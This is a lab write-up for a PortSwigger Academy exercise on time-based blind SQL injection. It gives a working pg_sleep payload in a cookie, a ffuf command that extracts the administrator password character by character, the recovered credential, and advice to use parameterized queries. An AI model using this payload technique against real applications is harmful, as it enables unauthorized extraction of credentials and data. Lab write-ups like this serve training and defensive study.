# Blind SQL injection with time delays and information retrieval - PortSwigger Lab 41

**Severity:** Medium
**Target:** https://0a5f00fb041c096e81cd6653004b00cc.web-security-academy.net

## Summary
The application concatenates the user input directly into the query and interpreted as SQL, allowing injection that causes visible server-time response error


## Vulnerability Details
**Type:** Blind SQL injection - time-based
**Root Cause:** Lack of input sanitization/validation on the PostgreSQL DB, the vector is created via concatenation in the cookie. 
**Endpoint:**  /

## Steps to Reproduce

1. Create a wordlist from a-z, 0-9 & A-Z; called testefuz.txt
2. Try different types of database syntax until you identify PostgreSQL
3. Create a req.txt file to allocate the cookie header using the SQLi
4. After that, run ffuf attack-line with -ft '<4000' to filter TRUE.
5. Perform position by position until position 21 returns false.



## Proof of Concept

req.txt
```bash
GET / HTTP/1.1
Host: 0a7000f30398f6a58143fc3700470032.web-security-academy.net
Cookie: TrackingId='||(SELECT CASE WHEN (SUBSTRING(password, 1, 1) = 'FUZZ') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username= 'administrator')--; session=jhI1lu3OowndtqAj3qNuSFu1FHOG0Bj1
```

ffuf attack-line
```bash
ffuf -w /home/luweed/Documents/testefuz.txt:FUZZ \
     -request /home/luweed/Documents/req.txt \
     -request-proto https \
     -ft '<4000'
```

final req.txt (false)
```bash
GET / HTTP/1.1
Host: 0a7000f30398f6a58143fc3700470032.web-security-academy.net
Cookie: TrackingId='||(SELECT CASE WHEN (SUBSTRING(password, 21, 1) = 'FUZZ') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username= 'administrator')--; session=jhI1lu3OowndtqAj3qNuSFu1FHOG0Bj1
```


## Result

<br>
<img width="1920" height="1062" alt="Screenshot From 2026-05-02 10-49-21" src="https://github.com/user-attachments/assets/daf32b4a-d907-4280-a251-df9be2020d60" />



<br>
<br>
<img width="1920" height="932" alt="image" src="https://github.com/user-attachments/assets/beab24b3-7d21-4b21-8a45-ee640c5a67d4" />



<br>
<br>




user: administrator password:mq5pebbstt3itc8j82aa


## Impact

This vulnerability could lead to unauthorized account takeover. Access to the admin panel, data exposure, and the possibility of pivoting.

## Remediation
Use parameterized queries (prepared statements) to prevent user input from being interpreted as SQL. 
